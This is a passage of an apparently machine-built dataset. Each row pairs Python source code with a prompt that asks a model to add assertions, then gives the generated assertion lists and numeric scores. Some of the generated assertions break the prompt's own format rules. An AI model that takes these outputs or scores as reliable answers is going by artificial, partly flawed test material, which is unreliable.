126","[['len(img_shape)', '==', '2'], ['len(tile_shape)', '==', '2'], ['len(tile_spacing)', '==', '2'], ['len(X)', '==', '4']]",4,4,1.0,0.0008276432857438,"['ndar', 'eps', 'X', 'img_shape', 'tile_shape', 'tile_spacing', '0', '# out_shape', '# out_shape[0]', '# out_shape[1]', 'out_shape', 'out_array', 'channel_defaults', 'dt', 'out_array[:', ':', 'i]', 'H', 'W', 'Hs', 'Ws', 'this_x', 'this_img', 'c', ']']",25,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['ndar', 'eps', 'X', 'img_shape', 'tile_shape', 'tile_spacing', '0', '# out_shape', '# out_shape[0]', '# out_shape[1]', 'out_shape', 'out_array', 'channel_defaults', 'dt', 'out_array[:', ':', 'i]', 'H', 'W', 'Hs', 'Ws', 'this_x', 'this_img', 'c', ']']
*Code:

1import numpy
2
3'''
4Adapted from http://deeplearning.net/tutorial/code/utils.py
5'''
6
7
8def scale_to_unit_interval(ndar, eps=1e-8):
9    """""" Scales all values in the ndarray ndar to be between 0 and 1 """"""
10    ndar = ndar.copy()
11    ndar -= ndar.min()
12    ndar *= 1.0 / (ndar.max() + eps)
13    return ndar
14
15def tile_raster_images(X, img_shape, tile_shape, tile_spacing=(0, 0),
16                       scale_rows_to_unit_interval=True,
17                       output_pixel_vals=True):
18    """"""
19    Transform an array with one flattened image per row, into an array in
20    which images are reshaped and layed out like tiles on a floor.
21
22    This function is useful for visualizing datasets whose rows are images,
23    and also columns of matrices for transforming those rows
24    (such as the first layer of a neural net).
25
26    :type X: a 2-D ndarray or a tuple of 4 channels, elements of which can
27    be 2-D ndarrays or None;
28    :param X: a 2-D array in which every row is a flattened image.
29
30    :type img_shape: tuple; (height, width)
31    :param img_shape: the original shape of each image
32
33    :type tile_shape: tuple; (rows, cols)
34    :param tile_shape: the number of images to tile (rows, cols)
35
36    :param output_pixel_vals: if output should be pixel values (i.e. int8
37    values) or floats
38
39    :param scale_rows_to_unit_interval: if the values need to be scaled before
40    being plotted to [0,1] or not
41
42
43    :returns: array suitable for viewing as an image.
44    (See:`PIL.Image.fromarray`.)
45    :rtype: a 2-d array with same dtype as X.
46
47    """"""
48
49
50    # The expression below can be re-written in a more C style as
51    # follows :
52    #
53    # out_shape    = [0,0]
54    # out_shape[0] = (img_shape[0]+tile_spacing[0])*tile_shape[0] -
55    #                tile_spacing[0]
56    # out_shape[1] = (img_shape[1]+tile_spacing[1])*tile_shape[1] -
57    #                tile_spacing[1]
58    out_shape = [(ishp + tsp) * tshp - tsp for ishp, tshp, tsp
59                        in zip(img_shape, tile_shape, tile_spacing)]
60
61    if isinstance(X, (list, tuple)):
62        # Create an output numpy ndarray to store the image
63        if output_pixel_vals:
64            out_array = numpy.zeros((out_shape[0], out_shape[1], 4),
65                                    dtype='uint8')
66        else:
67            out_array = numpy.zeros((out_shape[0], out_shape[1], 4),
68                                    dtype=X.dtype)
69
70        #colors default to 0, alpha defaults to 1 (opaque)
71        if output_pixel_vals:
72            channel_defaults = [0, 0, 0, 255]
73        else:
74            channel_defaults = [0., 0., 0., 1.]
75
76        for i in xrange(4):
77            if X[i] is None:
78                # if channel is None, fill it with zeros of the correct
79                # dtype
80                dt = out_array.dtype
81                if output_pixel_vals:
82                    dt = 'uint8'
83                out_array[:, :, i] = numpy.zeros(out_shape,
84                        dtype=dt) + channel_defaults[i]
85            else:
86                # use a recurrent call to compute the channel and store it
87                # in the output
88                out_array[:, :, i] = tile_raster_images(
89                    X[i], img_shape, tile_shape, tile_spacing,
90                    scale_rows_to_unit_interval, output_pixel_vals)
91        return out_array
92
93    else:
94        # if we are dealing with only one channel
95        H, W = img_shape
96        Hs, Ws = tile_spacing
97
98        # generate a matrix to store the output
99        dt = X.dtype
100        if output_pixel_vals:
101            dt = 'uint8'
102        out_array = numpy.zeros(out_shape, dtype=dt)
103
104        for tile_row in xrange(tile_shape[0]):
105            for tile_col in xrange(tile_shape[1]):
106                if tile_row * tile_shape[1] + tile_col < X.shape[0]:
107                    this_x = X[tile_row * tile_shape[1] + tile_col]
108                    if scale_rows_to_unit_interval:
109                        # if we should scale values to be between 0 and 1
110                        # do this by calling the `scale_to_unit_interval`
111                        # function
112                        this_img = scale_to_unit_interval(
113                            this_x.reshape(img_shape))
114                    else:
115                        this_img = this_x.reshape(img_shape)
116                    # add the slice to the corresponding position in the
117                    # output array
118                    c = 1
119                    if output_pixel_vals:
120                        c = 255
121                    out_array[
122                        tile_row * (H + Hs): tile_row * (H + Hs) + H,
123                        tile_col * (W + Ws): tile_col * (W + Ws) + W
124                        ] = this_img * c
125        return out_array
126",6611,"[[8, 'ndar', '!=', None, 'The function requires ""ndar"" to be not None to perform operations.'],
[8, 'eps', '>', 0, 'In order to avoid division by zero error, ""eps"" should be greater than zero.'],
[15, 'X', '!=', None, 'The function requires ""X"" to be not None to perform operations.'],
[15, 'img_shape', '!=', None, 'The function requires ""img_shape"" to be not None to provide image dimensions.'],
[15, 'tile_shape', '!=', None, 'The function requires ""tile_shape"" to be not None to create tiles.'],
[15, 'tile_spacing', '!=', None, ""The function requires 'tile_spacing' variable should not be None to allocate spacing between tiles.""],
[50, 'out_shape', '==', 2, 'The ""out_shape"" list should have exactly two elements to provide dimensions of final output.'],
[95, 'H', '>=', 0, 'The height of the image ""H"" should be non-negative.'],
[95, 'W', '>=', 0, 'The width of the image ""W"" should be non-negative.'],
[97, 'Hs', '>=', 0, 'The height spacing ""Hs"" should be non-negative.'],
[97, 'Ws', '>=', 0, 'The width spacing ""Ws"" should be non-negative.'],
[102, 'out_array', '!=', None, 'The output array ""out_array"" should be initialized properly and not None.']]"
matthagy/pointpot,"'''Raw interface to c extension
'''

from __future__ import division
from __future__ import absolute_import

import ctypes

import numpy as np

from .cutil import *
from .cinf import maybe_wire_dylib, select_lib
from .tempfile import temporary_file
from .fingerprint import PairOrientationFingerPrint


LIB_NAME = 'libpointpot'

maybe_wire_dylib(LIB_NAME)

clib = deflib(select_lib(LIB_NAME),
              symbol_translator = lambda s: 'POINTPOT_' + s,
              defs=[
    [c_void_p, 'COUL_load', [c_void_p]],
    [c_void, 'COUL_free', [c_void_p]],
    [c_double, 'BASE_calculate_potential', [c_void_p,
                                            c_double_p, c_double_p,
                                            c_double_p, c_double_p]],
    [c_void, 'BASE_calculate_forces_torques', [c_void_p,
                                               c_double_p, c_double_p,
                                               c_double_p, c_double_p,
                                               c_double_p, c_double_p,
                                               c_double_p, c_double_p]],
    [c_void, 'BASE_calculate_point_charge_set_sizes', [c_void_p,
                                                       c_int_p, c_int_p,
                                                       c_double_p, c_double_p,
                                                       c_double_p, c_double_p]],

    ])


class CCoulombPointPotential(object):

    c_ptr = None

    def __init__(self, c_ptr):
        self.c_ptr = c_ptr

    def __del__(self):
        c_ptr = self.c_ptr
        self.c_ptr = None
        if c_ptr is not None:
            clib.COUL_free(c_ptr)

    @classmethod
    def from_binary_file(cls, fp):
        return cls(clib.COUL_load(ctypes.pythonapi.PyFile_AsFile(fp)))

    @classmethod
    def from_binary_filepath(cls, path):
        with open(path) as fp:
            return cls.from_binary_file(fp)

    @classmethod
    def from_coulomb_point_potential(cls, cpp, truncate=False):
        with temporary_file(suffix='bin') as path:
            cpp.write_binary_filepath(path, truncate=truncate)
            return cls.from_binary_filepath(path)

    def evaluate_potential(self, r, omega, theta_i, theta_j):
        fp = PairOrientationFingerPrint(r=r, omega=omega, theta_i=theta_i, theta_j=theta_j)
        return self.evaluate_pair_potential(fp.create_pair_with_orientation())

    def evaluate_pair_potential(self, pair):
        holder, pos_i, rot_i, pos_j, rot_j = self.unpack_pair(pair)
        return clib.BASE_calculate_potential(self.c_ptr, pos_i, rot_i, pos_j, rot_j)

    def ex_evaluate_pair_potential(self, pos_i, rot_i, pos_j, rot_j):
        holder, pos_i, rot_i, pos_j, rot_j = self.setup_pair(pos_i, rot_i, pos_j, rot_j)
        return clib.BASE_calculate_potential(self.c_ptr, pos_i, rot_i, pos_j, rot_j)

    def evaluate_pair_forces_and_torques(self, pair):
        holder, pos_i, rot_i, pos_j, rot_j = self.unpack_pair(pair)
        [[force_i, torque_i], [force_j, torque_j]] = res = np.empty((2,2,3), dtype=c_double)
        clib.BASE_calculate_forces_torques(self.c_ptr,
                                           force_i.ctypes.data_as(c_double_p),
                                           torque_i.ctypes.data_as(c_double_p),
                                           force_j.ctypes.data_as(c_double_p),
                                           torque_j.ctypes.data_as(c_double_p),
                                           pos_i, rot_i, pos_j, rot_j)
        return res

    def ex_evaluate_pair_forces_and_torques(self, pos_i, rot_i, pos_j, rot_j):
        holder, pos_i, rot_i, pos_j, rot_j = self.setup_pair(pos_i, rot_i, pos_j, rot_j)
        [[force_i, torque_i], [force_j, torque_j]] = res = np.empty((2,2,3), dtype=c_double)
        clib.BASE_calculate_forces_torques(self.c_ptr,
                                           force_i.ctypes.data_as(c_double_p),
                                           torque_i.ctypes.data_as(c_double_p),
                                           force_j.ctypes.data_as(c_double_p),
                                           torque_j.ctypes.data_as(c_double_p),
                                           pos_i, rot_i, pos_j, rot_j)
        return res

    def calculate_charge_set_sizes(self, r, omega, theta_i, theta_j):
        fp = PairOrientationFingerPrint(r=r, omega=omega, theta_i=theta_i, theta_j=theta_j)
        return self.calculate_pair_point_charge_set_sizes(fp.create_pair_with_orientation())

    def calculate_pair_point_charge_set_sizes(self, pair):
        i = ctypes.c_int(0)
        j = ctypes.c_int(0)
        holder, pos_i, rot_i, pos_j, rot_j = self.unpack_pair(pair)
        clib.BASE_calculate_point_charge_set_sizes(self.c_ptr, ctypes.byref(i), ctypes.byref(j),
                                                   pos_i, rot_i, pos_j, rot_j)
        return i.value, j.value

    @classmethod
    def unpack_pair(cls, pair):
        pos_i = np.asarray(pair.p_i.position, dtype=c_double, order='C')
        pos_j = np.asarray(pair.p_j.position, dtype=c_double, order='C')
        assert pos_i.shape == (3,)
        assert pos_j.shape == (3,)

        rot_i = np.asarray(pair.p_i.rotation, dtype=c_double, order='C')
        rot_j = np.asarray(pair.p_j.rotation, dtype=c_double, order='C')
        assert rot_i.shape == (3,3)
        assert rot_j.shape == (3,3)

        return cls.setup_pair(pos_i, rot_i, pos_j, rot_j)

    @staticmethod
    def setup_pair(pos_i, rot_i, pos_j, rot_j):
        return [[pos_i, rot_i, pos_j, rot_j],
                pos_i.ctypes.data_as(c_double_p),
                rot_i.ctypes.data_as(c_double_p),
                pos_j.ctypes.data_as(c_double_p),
                rot_j.ctypes.data_as(c_double_p)]


","
1'''Raw interface to c extension
2'''
3
4from __future__ import division
5from __future__ import absolute_import
6
7import ctypes
8
9import numpy as np
10
11from .cutil import *
12from .cinf import maybe_wire_dylib, select_lib
13from .tempfile import temporary_file
14from .fingerprint import PairOrientationFingerPrint
15
16
17LIB_NAME = 'libpointpot'
18
19maybe_wire_dylib(LIB_NAME)
20
21clib = deflib(select_lib(LIB_NAME),
22              symbol_translator = lambda s: 'POINTPOT_' + s,
23              defs=[
24    [c_void_p, 'COUL_load', [c_void_p]],
25    [c_void, 'COUL_free', [c_void_p]],
26    [c_double, 'BASE_calculate_potential', [c_void_p,
27                                            c_double_p, c_double_p,
28                                            c_double_p, c_double_p]],
29    [c_void, 'BASE_calculate_forces_torques', [c_void_p,
30                                               c_double_p, c_double_p,
31                                               c_double_p, c_double_p,
32                                               c_double_p, c_double_p,
33                                               c_double_p, c_double_p]],
34    [c_void, 'BASE_calculate_point_charge_set_sizes', [c_void_p,
35                                                       c_int_p, c_int_p,
36                                                       c_double_p, c_double_p,
37                                                       c_double_p, c_double_p]],
38
39    ])
40
41
42class CCoulombPointPotential(object):
43
44    c_ptr = None
45
46    def __init__(self, c_ptr):
47        self.c_ptr = c_ptr
48
49    def __del__(self):
50        c_ptr = self.c_ptr
51        self.c_ptr = None
52        if c_ptr is not None:
53            clib.COUL_free(c_ptr)
54
55    @classmethod
56    def from_binary_file(cls, fp):
57        return cls(clib.COUL_load(ctypes.pythonapi.PyFile_AsFile(fp)))
58
59    @classmethod
60    def from_binary_filepath(cls, path):
61        with open(path) as fp:
62            return cls.from_binary_file(fp)
63
64    @classmethod
65    def from_coulomb_point_potential(cls, cpp, truncate=False):
66        with temporary_file(suffix='bin') as path:
67            cpp.write_binary_filepath(path, truncate=truncate)
68            return cls.from_binary_filepath(path)
69
70    def evaluate_potential(self, r, omega, theta_i, theta_j):
71        fp = PairOrientationFingerPrint(r=r, omega=omega, theta_i=theta_i, theta_j=theta_j)
72        return self.evaluate_pair_potential(fp.create_pair_with_orientation())
73
74    def evaluate_pair_potential(self, pair):
75        holder, pos_i, rot_i, pos_j, rot_j = self.unpack_pair(pair)
76        return clib.BASE_calculate_potential(self.c_ptr, pos_i, rot_i, pos_j, rot_j)
77
78    def ex_evaluate_pair_potential(self, pos_i, rot_i, pos_j, rot_j):
79        holder, pos_i, rot_i, pos_j, rot_j = self.setup_pair(pos_i, rot_i, pos_j, rot_j)
80        return clib.BASE_calculate_potential(self.c_ptr, pos_i, rot_i, pos_j, rot_j)
81
82    def evaluate_pair_forces_and_torques(self, pair):
83        holder, pos_i, rot_i, pos_j, rot_j = self.unpack_pair(pair)
84        [[force_i, torque_i], [force_j, torque_j]] = res = np.empty((2,2,3), dtype=c_double)
85        clib.BASE_calculate_forces_torques(self.c_ptr,
86                                           force_i.ctypes.data_as(c_double_p),
87                                           torque_i.ctypes.data_as(c_double_p),
88                                           force_j.ctypes.data_as(c_double_p),
89                                           torque_j.ctypes.data_as(c_double_p),
90                                           pos_i, rot_i, pos_j, rot_j)
91        return res
92
93    def ex_evaluate_pair_forces_and_torques(self, pos_i, rot_i, pos_j, rot_j):
94        holder, pos_i, rot_i, pos_j, rot_j = self.setup_pair(pos_i, rot_i, pos_j, rot_j)
95        [[force_i, torque_i], [force_j, torque_j]] = res = np.empty((2,2,3), dtype=c_double)
96        clib.BASE_calculate_forces_torques(self.c_ptr,
97                                           force_i.ctypes.data_as(c_double_p),
98                                           torque_i.ctypes.data_as(c_double_p),
99                                           force_j.ctypes.data_as(c_double_p),
100                                           torque_j.ctypes.data_as(c_double_p),
101                                           pos_i, rot_i, pos_j, rot_j)
102        return res
103
104    def calculate_charge_set_sizes(self, r, omega, theta_i, theta_j):
105        fp = PairOrientationFingerPrint(r=r, omega=omega, theta_i=theta_i, theta_j=theta_j)
106        return self.calculate_pair_point_charge_set_sizes(fp.create_pair_with_orientation())
107
108    def calculate_pair_point_charge_set_sizes(self, pair):
109        i = ctypes.c_int(0)
110        j = ctypes.c_int(0)
111        holder, pos_i, rot_i, pos_j, rot_j = self.unpack_pair(pair)
112        clib.BASE_calculate_point_charge_set_sizes(self.c_ptr, ctypes.byref(i), ctypes.byref(j),
113                                                   pos_i, rot_i, pos_j, rot_j)
114        return i.value, j.value
115
116    @classmethod
117    def unpack_pair(cls, pair):
118        pos_i = np.asarray(pair.p_i.position, dtype=c_double, order='C')
119        pos_j = np.asarray(pair.p_j.position, dtype=c_double, order='C')
120
121        rot_i = np.asarray(pair.p_i.rotation, dtype=c_double, order='C')
122        rot_j = np.asarray(pair.p_j.rotation, dtype=c_double, order='C')
123
124        return cls.setup_pair(pos_i, rot_i, pos_j, rot_j)
125
126    @staticmethod
127    def setup_pair(pos_i, rot_i, pos_j, rot_j):
128        return [[pos_i, rot_i, pos_j, rot_j],
129                pos_i.ctypes.data_as(c_double_p),
130                rot_i.ctypes.data_as(c_double_p),
131                pos_j.ctypes.data_as(c_double_p),
132                rot_j.ctypes.data_as(c_double_p)]
133
134
135","[['pos_i.shape', '==', '(3'], ['pos_j.shape', '==', '(3'], ['rot_i.shape', '==', '(3'], ['rot_j.shape', '==', '(3']]",4,4,1.0,0.0006960153123368,"['LIB_NAME', 'clib', 'symbol_translator', 'c_ptr', 'self.c_ptr', 'cls', 'fp', 'path', 'cpp', 'truncate', 'r', 'omega', 'theta_i', 'theta_j', 'pair', 'holder', 'pos_i', 'rot_i', 'pos_j', 'rot_j', '[[force_i', 'torque_i]', '[force_j', 'torque_j]]', 'i', 'j']",26,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['LIB_NAME', 'clib', 'symbol_translator', 'c_ptr', 'self.c_ptr', 'cls', 'fp', 'path', 'cpp', 'truncate', 'r', 'omega', 'theta_i', 'theta_j', 'pair', 'holder', 'pos_i', 'rot_i', 'pos_j', 'rot_j', '[[force_i', 'torque_i]', '[force_j', 'torque_j]]', 'i', 'j']
*Code:

1'''Raw interface to c extension
2'''
3
4from __future__ import division
5from __future__ import absolute_import
6
7import ctypes
8
9import numpy as np
10
11from .cutil import *
12from .cinf import maybe_wire_dylib, select_lib
13from .tempfile import temporary_file
14from .fingerprint import PairOrientationFingerPrint
15
16
17LIB_NAME = 'libpointpot'
18
19maybe_wire_dylib(LIB_NAME)
20
21clib = deflib(select_lib(LIB_NAME),
22              symbol_translator = lambda s: 'POINTPOT_' + s,
23              defs=[
24    [c_void_p, 'COUL_load', [c_void_p]],
25    [c_void, 'COUL_free', [c_void_p]],
26    [c_double, 'BASE_calculate_potential', [c_void_p,
27                                            c_double_p, c_double_p,
28                                            c_double_p, c_double_p]],
29    [c_void, 'BASE_calculate_forces_torques', [c_void_p,
30                                               c_double_p, c_double_p,
31                                               c_double_p, c_double_p,
32                                               c_double_p, c_double_p,
33                                               c_double_p, c_double_p]],
34    [c_void, 'BASE_calculate_point_charge_set_sizes', [c_void_p,
35                                                       c_int_p, c_int_p,
36                                                       c_double_p, c_double_p,
37                                                       c_double_p, c_double_p]],
38
39    ])
40
41
42class CCoulombPointPotential(object):
43
44    c_ptr = None
45
46    def __init__(self, c_ptr):
47        self.c_ptr = c_ptr
48
49    def __del__(self):
50        c_ptr = self.c_ptr
51        self.c_ptr = None
52        if c_ptr is not None:
53            clib.COUL_free(c_ptr)
54
55    @classmethod
56    def from_binary_file(cls, fp):
57        return cls(clib.COUL_load(ctypes.pythonapi.PyFile_AsFile(fp)))
58
59    @classmethod
60    def from_binary_filepath(cls, path):
61        with open(path) as fp:
62            return cls.from_binary_file(fp)
63
64    @classmethod
65    def from_coulomb_point_potential(cls, cpp, truncate=False):
66        with temporary_file(suffix='bin') as path:
67            cpp.write_binary_filepath(path, truncate=truncate)
68            return cls.from_binary_filepath(path)
69
70    def evaluate_potential(self, r, omega, theta_i, theta_j):
71        fp = PairOrientationFingerPrint(r=r, omega=omega, theta_i=theta_i, theta_j=theta_j)
72        return self.evaluate_pair_potential(fp.create_pair_with_orientation())
73
74    def evaluate_pair_potential(self, pair):
75        holder, pos_i, rot_i, pos_j, rot_j = self.unpack_pair(pair)
76        return clib.BASE_calculate_potential(self.c_ptr, pos_i, rot_i, pos_j, rot_j)
77
78    def ex_evaluate_pair_potential(self, pos_i, rot_i, pos_j, rot_j):
79        holder, pos_i, rot_i, pos_j, rot_j = self.setup_pair(pos_i, rot_i, pos_j, rot_j)
80        return clib.BASE_calculate_potential(self.c_ptr, pos_i, rot_i, pos_j, rot_j)
81
82    def evaluate_pair_forces_and_torques(self, pair):
83        holder, pos_i, rot_i, pos_j, rot_j = self.unpack_pair(pair)
84        [[force_i, torque_i], [force_j, torque_j]] = res = np.empty((2,2,3), dtype=c_double)
85        clib.BASE_calculate_forces_torques(self.c_ptr,
86                                           force_i.ctypes.data_as(c_double_p),
87                                           torque_i.ctypes.data_as(c_double_p),
88                                           force_j.ctypes.data_as(c_double_p),
89                                           torque_j.ctypes.data_as(c_double_p),
90                                           pos_i, rot_i, pos_j, rot_j)
91        return res
92
93    def ex_evaluate_pair_forces_and_torques(self, pos_i, rot_i, pos_j, rot_j):
94        holder, pos_i, rot_i, pos_j, rot_j = self.setup_pair(pos_i, rot_i, pos_j, rot_j)
95        [[force_i, torque_i], [force_j, torque_j]] = res = np.empty((2,2,3), dtype=c_double)
96        clib.BASE_calculate_forces_torques(self.c_ptr,
97                                           force_i.ctypes.data_as(c_double_p),
98                                           torque_i.ctypes.data_as(c_double_p),
99                                           force_j.ctypes.data_as(c_double_p),
100                                           torque_j.ctypes.data_as(c_double_p),
101                                           pos_i, rot_i, pos_j, rot_j)
102        return res
103
104    def calculate_charge_set_sizes(self, r, omega, theta_i, theta_j):
105        fp = PairOrientationFingerPrint(r=r, omega=omega, theta_i=theta_i, theta_j=theta_j)
106        return self.calculate_pair_point_charge_set_sizes(fp.create_pair_with_orientation())
107
108    def calculate_pair_point_charge_set_sizes(self, pair):
109        i = ctypes.c_int(0)
110        j = ctypes.c_int(0)
111        holder, pos_i, rot_i, pos_j, rot_j = self.unpack_pair(pair)
112        clib.BASE_calculate_point_charge_set_sizes(self.c_ptr, ctypes.byref(i), ctypes.byref(j),
113                                                   pos_i, rot_i, pos_j, rot_j)
114        return i.value, j.value
115
116    @classmethod
117    def unpack_pair(cls, pair):
118        pos_i = np.asarray(pair.p_i.position, dtype=c_double, order='C')
119        pos_j = np.asarray(pair.p_j.position, dtype=c_double, order='C')
120
121        rot_i = np.asarray(pair.p_i.rotation, dtype=c_double, order='C')
122        rot_j = np.asarray(pair.p_j.rotation, dtype=c_double, order='C')
123
124        return cls.setup_pair(pos_i, rot_i, pos_j, rot_j)
125
126    @staticmethod
127    def setup_pair(pos_i, rot_i, pos_j, rot_j):
128        return [[pos_i, rot_i, pos_j, rot_j],
129                pos_i.ctypes.data_as(c_double_p),
130                rot_i.ctypes.data_as(c_double_p),
131                pos_j.ctypes.data_as(c_double_p),
132                rot_j.ctypes.data_as(c_double_p)]
133
134
135",7539,"[116, 'pair', '!=', 'None', ""Pair should not be 'None' to correctly unpack and further process accordingly""],
[47, 'c_ptr', '!=', 'None', ""c_ptr should not be 'None' in order to correctly initialize object""],
[59, 'fp', '!=', 'None', ""File pointer should not be 'None' to create CCoulombPointPotential object from binary file""],
[60, 'path', '!=', 'None', ""File path should not be 'None' to create CCoulombPointPotential object from the binary file located at the path""],
[64, 'cpp', '!=', 'None', ""Coulomb point potential object should not be 'None' to create another CCoulombPointPotential object""],
[70, 'r', '>=', 0, ""The variable 'r' should be greater than or equal to zero for correct calculation of potential""],
[70, 'omega', '!=', 'None', ""The variable 'omega' should not be 'None' for correct calculation of potential""],
[70, 'theta_i', '!=', 'None', ""The variable 'theta_i' should not be 'None' for correct calculation of potential""],
[70, 'theta_j', '!=', 'None', ""The variable 'theta_j' should not be 'None' for correct calculation of potential""],
[74, 'pair', '!=', 'None', ""Pair should not be 'None' for correct calculation of pair potential""],
[78, 'pos_i', '!=', 'None', ""The variable 'pos_i' should not be 'None' for correct calculation of pair potential""],
[78, 'rot_i', '!=', 'None', ""The variable 'rot_i' should not be 'None' for correct calculation of pair potential""],
[78, 'pos_j', '!=', 'None', ""The variable 'pos_j' should not be 'None' for correct calculation of pair potential""],
[78, 'rot_j', '!=', 'None', ""The variable 'rot_j' should not be 'None' for correct calculation of pair potential""],
[82, 'pair', '!=', 'None', ""Pair should not be 'None' for correct calculation of pair forces and torques""],
[93, 'pos_i', '!=', 'None', ""The variable 'pos_i' should not be 'None' for correct calculation of pair forces and torques""],
[93, 'rot_i', '!=', 'None', ""The variable 'rot_i' should not be 'None' for correct calculation of pair forces and torques""],
[93, 'pos_j', '!=', 'None', ""The variable 'pos_j' should not be 'None' for correct calculation of pair forces and torques""],
[93, 'rot_j', '!=', 'None', ""The variable 'rot_j' should not be 'None' for correct calculation of pair forces and torques""],
[104, 'r', '>=', 0, ""The variable 'r' should be greater than or equal to zero for correctly calculating charge set sizes""],
[104, 'omega', '!=', 'None', ""The variable 'omega' should not be 'None' for correctly calculating charge set sizes""],
[104, 'theta_i', '!=', 'None', ""The variable 'theta_i' should not be 'None' for correctly calculating charge set sizes""],
[104, 'theta_j', '!=', 'None', ""The variable 'theta_j' should not be 'None' for correctly calculating charge set sizes""],
[108, 'pair', '!=', 'None', ""Pair should not be 'None' to correctly calculate pair point charge set sizes""],
[117, 'pair', '!=', 'None', ""Pair should not be 'None' to correctly unpack pair""],
[127, 'pos_i', '!=', 'None', ""The variable 'pos_i' should not be 'None' for setting up pair""],
[127, 'rot_i', '!=', 'None', ""The variable 'rot_i' should not be 'None' for setting up pair""],
[127, 'pos_j', '!=', 'None', ""The variable 'pos_j' should not be 'None' for setting up pair""],
[127, 'rot_j', '!=', 'None', ""The variable 'rot_j' should not be 'None' for setting up pair""],"
otsaloma/helsinki-city-bikes,"# -*- coding: utf-8 -*-

# Copyright (C) 2015 Osmo Salomaa
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import hcb.test
import threading
import time


class TestConnectionPool(hcb.test.TestCase):

    def setup_method(self, method):
        self.pool = hcb.http.ConnectionPool(2)
        self.http_url = ""http://github.com/otsaloma/helsinki-city-bikes""
        self.https_url = ""https://github.com/otsaloma/helsinki-city-bikes""

    def teardown_method(self, method):
        self.pool.terminate()

    def test_get__2(self):
        connection1 = self.pool.get(self.http_url)
        connection2 = self.pool.get(self.http_url)
        assert connection1 is not None
        assert connection2 is not None

    def test_get__http(self):
        connection = self.pool.get(self.http_url)
        assert connection is not None

    def test_get__https(self):
        connection = self.pool.get(self.https_url)
        assert connection is not None

    def test_get__terminate_blocking(self):
        kwargs = dict(target=self.pool.get, args=(self.http_url,))
        threading.Thread(**kwargs).start()
        threading.Thread(**kwargs).start()
        # The third of these calls should block, but gracefully exit
        # by raising an exception when terminate is called.
        threading.Thread(**kwargs).start()
        self.pool.terminate()
        time.sleep(3)

    def test_is_alive(self):
        assert self.pool.is_alive()
        self.pool.terminate()
        assert not self.pool.is_alive()

    def test_put(self):
        connection = self.pool.get(self.http_url)
        assert connection is not None
        self.pool.put(self.http_url, connection)
        connection = self.pool.get(self.http_url)
        assert connection is not None

    def test_reset(self):
        connection = self.pool.get(self.http_url)
        assert connection is not None
        self.pool.put(self.http_url, connection)
        self.pool.reset(self.http_url)
        connection = self.pool.get(self.http_url)
        assert connection is not None

    def test_terminate(self):
        self.pool.terminate()
        assert not self.pool.is_alive()


class TestModule(hcb.test.TestCase):

    def test_request_json(self):
        url = ""https://api.github.com/repos/otsaloma/helsinki-city-bikes/releases""
        json = hcb.http.request_json(url)
        assert isinstance(json, list)

    def test_request_json__error(self):
        url = ""https://github.com/otsaloma/helsinki-city-bikes""
        self.assert_raises(Exception, hcb.http.request_json, url)

    def test_request_url(self):
        url = ""https://github.com/otsaloma/helsinki-city-bikes""
        blob = hcb.http.request_url(url, encoding=""utf_8"")
        assert blob.strip().startswith(""<!DOCTYPE html>"")

    def test_request_url__error(self):
        url = ""http://xxx.yyy.zzz/""
        self.assert_raises(Exception, hcb.http.request_url, url)

    def test_request_url__non_200(self):
        url = ""http://www.google.com/xxx/yyy/zzz""
        self.assert_raises(Exception, hcb.http.request_url, url)
","
1# -*- coding: utf-8 -*-
2
3# Copyright (C) 2015 Osmo Salomaa
4#
5# This program is free software: you can redistribute it and/or modify
6# it under the terms of the GNU General Public License as published by
7# the Free Software Foundation, either version 3 of the License, or
8# (at your option) any later version.
9#
10# This program is distributed in the hope that it will be useful,
11# but WITHOUT ANY WARRANTY; without even the implied warranty of
12# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
13# GNU General Public License for more details.
14#
15# You should have received a copy of the GNU General Public License
16# along with this program.  If not, see <http://www.gnu.org/licenses/>.
17
18import hcb.test
19import threading
20import time
21
22
23class TestConnectionPool(hcb.test.TestCase):
24
25    def setup_method(self, method):
26        self.pool = hcb.http.ConnectionPool(2)
27        self.http_url = ""http://github.com/otsaloma/helsinki-city-bikes""
